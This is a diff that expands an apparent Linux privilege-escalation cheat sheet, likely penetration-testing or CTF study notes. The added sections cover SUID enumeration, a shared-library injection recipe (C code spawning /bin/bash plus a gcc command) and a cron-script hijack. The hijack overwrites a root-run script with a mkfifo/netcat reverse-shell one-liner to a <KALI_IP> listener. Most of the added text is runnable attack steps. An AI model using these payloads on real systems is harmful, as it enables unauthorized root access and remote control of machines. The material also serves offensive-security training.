@@ -30,6 +30,66 @@ find / -perm -4000 -type f 2>/dev/null
 ```
 → Searches the entire filesystem for binaries with the SUID bit set, which causes them to execute with the file owner's privileges (often root) instead of the caller's. Every result is a potential privilege escalation — look each one up on **GTFOBins** for a known exploitation path.
 
+> **GTFOBins** — https://gtfobins.github.io
+> Search the binary name, click SUID, and it gives you the exact command to run to abuse it.
+
+### Binaries to Investigate
+If you see any of these in your SUID results, look them up on GTFOBins or searchsploit — they have known abuse paths:
+```
+find, vim, nano, python, perl, bash, cp, tar, awk, less, curl, wget, dd, tee, pkexec
+```
+Also investigate **anything non-standard** — a binary that has no reason to be SUID is a red flag.
+
+### Non-Standard SUID — Shared Object Injection
+
+When a custom SUID binary isn't on GTFOBins, use `strace` to see what files it tries to open at runtime:
+
+```bash
+strace /path/to/suid-binary 2>&1 | grep -iE "open|access|no such file"
+```
+→ Look for lines ending in `ENOENT (No such file or directory)` pointing to `.so` files. If that path is somewhere you can write to, you can plant a malicious library there.
+
+**If you find a missing `.so` in a writable path:**
+
+1. Create the malicious C file:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+void <function_name>() {
+    system("/bin/bash");
+}
+```
+> The function name must match what the binary expects. Check with `strace` output or run `strings /path/to/binary` to find it.
+
+2. Compile as a shared library:
+```bash
+gcc -shared -o /path/to/missing.so -fPIC /path/to/source.c
+```
+
+3. Run the SUID binary — it loads your `.so`, calls your function, spawns bash as root:
+```bash
+/path/to/suid-binary
+```
+
+**Why it works:** SUID binaries execute as their owner (root). When the binary loads a shared library dynamically, that load also runs as root. Control the library = control what runs as root.
+
+### Binaries to Brush Off
+These appear on almost every Linux system and are expected to be SUID. They're dead ends without a password or special conditions:
+
+| Binary | Why it leads nowhere |
+|---|---|
+| `su` | needs a password |
+| `sudo` | needs a password (still run `sudo -l` though) |
+| `passwd` | needs current password |
+| `gpasswd` | needs group password |
+| `newgrp` | needs group membership |
+| `chsh` / `chfn` | change shell/user info, no shell path |
+| `mount` / `umount` | filesystem ops, limited without config |
+| `fusermount` | FUSE mounts, limited |
+| `ssh-keysign` | SSH internal helper |
+| `dbus-daemon-launch-helper` | D-Bus system internal |
+| `polkit-agent-helper` | polkit internal |
 ---
 
 ## 3. Cron Jobs
@@ -39,13 +99,64 @@ find / -perm -4000 -type f 2>/dev/null
 ```bash
 cat /etc/crontab
 ```
-→ Displays the system-wide cron schedule, showing tasks set to run automatically at specific times and the user they run as. If any script listed here is writable by you, you can inject commands that will execute as root when the job triggers.
+→ Displays the system-wide cron schedule. The output includes the path to each script and the user it runs as — the path is given to you directly, no hunting needed.
+
+Example output:
+```
+# m h dom mon dow user  command
+0 1 *  *   *   *   root  /usr/local/bin/backup.sh
+* * *  *   *   *   root  /opt/scripts/cleanup.py
+```
+
+**After getting output — the workflow:**
+1. Spot a job running as `root` with a script path
+2. Check if you can write to it:
+```bash
+ls -la /opt/scripts/cleanup.py
+```
+3. If writable, overwrite the script with a reverse shell — use `>` not `>>`:
+```bash
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <KALI_IP> <PORT> >/tmp/f" > /path/to/script.sh
+```
+→ Overwriting (`>`) is safer than appending (`>>`) — if the original script errors before your line, an appended payload never runs. Start your listener first: `nc -lvnp <PORT>`
+4. Wait for the cron to fire — it executes as root and sends you a root shell
 
 ```bash
 ls -la /etc/cron.*
 ```
 → Lists all cron directories (hourly, daily, weekly, etc.) to surface additional scheduled jobs that may not appear in the main crontab. Check each script file's permissions — a world-writable cron script is an instant root path.
 
+```bash
+cat /var/spool/cron/crontabs/root 2>/dev/null
+```
+→ Checks root's personal crontab — jobs defined here won't appear in `/etc/crontab` or `/etc/cron.*`. This is where custom frequent jobs (every minute, every 30 seconds via loops) are often defined.
+
+**If you find a writable script via section 7 (not in a cron directory):**
+Check if it's called by any cron job:
+```bash
+grep -r "script_name" /etc/cron* /var/spool/cron/ 2>/dev/null
+```
+→ A writable script anywhere on the filesystem can be a privesc path if root's cron calls it. Section 7 finds the writable file — this confirms it's being executed as root.
+
+Example output:
+```
+/etc/cron.daily:
+total 32
+drwxr-xr-x  2 root root 4096 Jan 10 12:00 .
+drwxr-xr-x 80 root root 4096 Jan 10 12:00 ..
+-rwxr-xr-x  1 root root  376 Jan 10 12:00 logrotate
+-rwxrwxrwx  1 root root  212 Jan 10 12:00 backup.sh
+```
+`backup.sh` is the hit — `rwxrwxrwx` means anyone can write to it, and since it lives in `cron.daily` root runs it every day. Inject your payload and wait.
+
+**Permission categories reminder:**
+```
+-rwxrwxrwx
+  ^^^        owner (root)
+     ^^^     group
+        ^^^  others (everyone else)
+```
+Each set is `rwx` — read, write, execute. A `-` means that permission is missing. `rwx------` means only the owner can do anything, everyone else has nothing.
 ---
 
 ## 4. Credential Hunting
